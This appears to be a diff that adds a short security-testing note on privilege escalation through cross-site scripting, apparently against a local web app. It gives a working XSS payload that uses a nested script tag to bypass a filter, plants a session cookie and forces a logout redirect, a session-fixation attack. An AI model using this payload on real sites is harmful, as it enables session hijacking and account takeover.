@@ -1,0 +1,7 @@
+Privilege Escalation via XSS:
+
+Using the XSS mentioned in 3:
+
+<script<script>document.cookie="connect.sid=s%3Acc8I-lp6dnwLgbuzp8Pn4a1IHyeyVoW6.b%2B8eW0a593QY9UTqcaVDIlmpuwXCq0Pimmtg6Uao4zg ;domain=127.0.0.1 ;path=/login";
+window.location.href="http://127.0.0.1:3000/logout";
+</script>
